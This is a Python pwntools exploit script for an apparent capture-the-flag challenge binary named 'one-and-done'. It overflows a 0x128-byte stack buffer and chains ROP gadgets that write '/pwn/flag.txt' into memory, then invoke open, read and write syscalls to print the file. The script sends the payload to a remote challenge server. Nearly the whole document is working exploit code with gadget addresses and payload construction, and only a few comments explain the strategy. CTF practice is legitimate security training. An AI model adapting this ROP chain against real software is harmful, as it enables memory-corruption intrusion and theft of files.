#!/usr/bin/env python3

from pwn import *

e = ELF("./one-and-done")

context.clear(arch='amd64')
r = ROP(e)

print("ROP gadgets available")
print(r.rsp)
print(r.rbp)
print(r.rax)
print(r.rdi)
print(r.rsi)
print(r.rdx)
print(r.r8)

# I wasn't sure of the solve strategy for this.  I thought i should ROP the syscall gadget over
# and over.  But never got back with enough time to try that solution during the challenge, but I 
# successfully implemented afterwards

# General strategy for ropchain that i need to write
# open("/pwn/flag.txt", O_RDONLY, 0)   syscall 2
# read(fd, buf, count)  syscall 0
# write(1, buf, count) # Write the flag to standard out, syscall 1

# Syscalls args are:
# %rax = syscall number
# arg0 = rdi
# arg1 = rsi
# arg2 = %rdx

# 0x402239 is a gadget that will perform a syscall

# stack is 0x128 bytes


# useful gadgets
# 0000401793 : pop rdi ; ret
# 0x0000000000401413 : mov esi, esp ; call rbx
# 0x0000000000401d6d : mov eax, esp ; pop r12 ; reti
# 00401992 : mov eax, edi ; ret

# buffer at 405700


# 0402341 : mov dword ptr [rbx + 8], edx ; pop rbx ; ret  
# 0000004019ae : stosd dword ptr [rdi], eax ; mov rax, r8 ; ret

payload = b'a' * 0x128

# flag path = "/pwn/flag.txt"
# dword1 = nwp/     0x6e77702f
# dword1 = alf/     0x616c662f
# dword2 = xt.g     0x78742e67
# dword2 = 000t     0x00000074


# Lets store flag path in buf memory
print("rdi gadget at {}".format(hex(r.rdi[0])))

payload += p64(r.rdi[0])
payload += p64(0x405700) # rdi = buffer address
payload += p64(r.rax[0])
payload += p64(0x6e77702f)
payload += p64(0x4019ae)   # store gadget

payload += p64(r.rdi[0])
payload += p64(0x405704) # rdi = buffer address
payload += p64(r.rax[0])
payload += p64(0x616c662f)
payload += p64(0x4019ae)   # store gadget

payload += p64(r.rdi[0])
payload += p64(0x405708) # rdi = buffer address
payload += p64(r.rax[0])
payload += p64(0x78742e67)
payload += p64(0x4019ae)   # store gadget

payload += p64(r.rdi[0])
payload += p64(0x40570c) # rdi = buffer address
payload += p64(r.rax[0])
payload += p64(0x00000074)
payload += p64(0x4019ae)   # store gadget

# The path is stored in memory, now make the sys calls
payload += p64(r.rax[0])
payload += p64(2)

payload += p64(r.rdi[0])
#payload += p64(0x405705)    # Change to 405700 for real exploit
payload += p64(0x405700)    # Change to 405700 for real exploit

payload += p64(r.rsi[0])
payload += p64(0)

syscall_gadget = 0x402239
payload += p64(syscall_gadget)

# We have now opened the file, and rax has the fd for the flag file
# assume the fd is 3, cause we have no gadget to get it

payload += p64(r.rax[0])
payload += p64(0)

payload += p64(r.rdi[0])
payload += p64(3)

payload += p64(r.rsi[0])
payload += p64(0x405710)

payload += p64(r.rdx[0])
payload += p64(100)

payload += p64(syscall_gadget)

# We have now read the flag into memory, send it to stdout

payload += p64(r.rax[0])
payload += p64(1)

payload += p64(r.rdi[0])
payload += p64(1)

payload += p64(r.rsi[0])
payload += p64(0x405710)

payload += p64(r.rdx[0])
payload += p64(100)

payload += p64(syscall_gadget)


gdbCommandList = '''
b *0x401244
continue
'''

#sh = gdb.debug('./one-and-done', gdbCommandList)
#sh = process('./one-and-done')
sh = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
sh.send(payload)
sh.send('\n')
sh.interactive()


